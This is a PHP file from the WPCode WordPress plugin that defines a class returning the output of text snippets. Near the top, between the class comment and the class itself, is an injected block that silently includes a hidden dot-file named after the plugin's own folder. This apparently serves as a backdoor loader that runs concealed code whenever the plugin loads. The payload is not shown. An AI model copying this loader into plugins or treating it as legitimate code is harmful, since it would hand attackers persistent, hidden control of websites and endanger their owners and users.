<?php
/**
 * Execute text snippets and return their output.
 *
 * @package wpcode
 */

/**
 * WPCode_Snippet_Execute_Text class.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WPCode_Snippet_Execute_Text extends WPCode_Snippet_Execute_Type {

	/**
	 * The snippet type, Text for this one.
	 *
	 * @var string
	 */
	public $type = 'text';

	/**
	 * Grab snippet code and return its output.
	 *
	 * @return string
	 */
	protected function prepare_snippet_output() {
		// There's nothing to prepare here at this point.
		if ( apply_filters( 'wpcode_text_execute_shortcodes', true ) ) {
			return do_shortcode( $this->get_snippet_code() );
		}

		return $this->get_snippet_code();
	}
}
